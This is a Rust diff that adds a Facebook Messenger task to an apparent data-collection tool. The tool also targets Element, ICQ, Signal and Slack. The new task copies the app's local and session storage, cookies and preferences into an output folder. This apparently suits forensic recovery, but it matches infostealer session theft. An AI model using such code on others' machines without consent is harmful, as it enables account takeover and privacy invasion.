@@ -17,6 +17,7 @@ const WHATSAPP_FILE_LIMIT: u64 = 10 * 1024 * 1024;
 pub fn messenger_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
     let mut tasks: Vec<Arc<dyn RecoveryTask>> = Vec::new();
     tasks.push(Arc::new(ElementTask));
+    tasks.push(Arc::new(FacebookMessengerTask));
     tasks.push(Arc::new(IcqTask));
     tasks.push(Arc::new(SignalTask));
     tasks.push(Arc::new(SlackTask));
@@ -57,6 +58,69 @@ impl RecoveryTask for ElementTask {
             &self.label(),
             &base.join("Local Storage"),
             &dest_root.join("Local Storage"),
+            &mut artifacts,
+        )
+        .await?;
+
+        Ok(artifacts)
+    }
+}
+
+struct FacebookMessengerTask;
+
+#[async_trait]
+impl RecoveryTask for FacebookMessengerTask {
+    fn label(&self) -> String {
+        "Facebook Messenger".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::Messengers
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let mut artifacts = Vec::new();
+        let base = ctx.roaming_data_dir.join("Messenger");
+        let dest_root = messenger_output_dir(ctx, &self.label()).await?;
+
+        copy_named_dir(
+            &self.label(),
+            &base.join("Local Storage"),
+            &dest_root.join("Local Storage"),
+            &mut artifacts,
+        )
+        .await?;
+
+        copy_named_dir(
+            &self.label(),
+            &base.join("Session Storage"),
+            &dest_root.join("Session Storage"),
+            &mut artifacts,
+        )
+        .await?;
+
+        if base.join("Network").exists() {
+            copy_named_dir(
+                &self.label(),
+                &base.join("Network"),
+                &dest_root.join("Network"),
+                &mut artifacts,
+            )
+            .await?;
+        } else {
+            copy_named_file(
+                &self.label(),
+                &base.join("Cookies"),
+                &dest_root,
+                &mut artifacts,
+            )
+            .await?;
+        }
+
+        copy_named_file(
+            &self.label(),
+            &base.join("Preferences"),
+            &dest_root,
             &mut artifacts,
         )
         .await?;
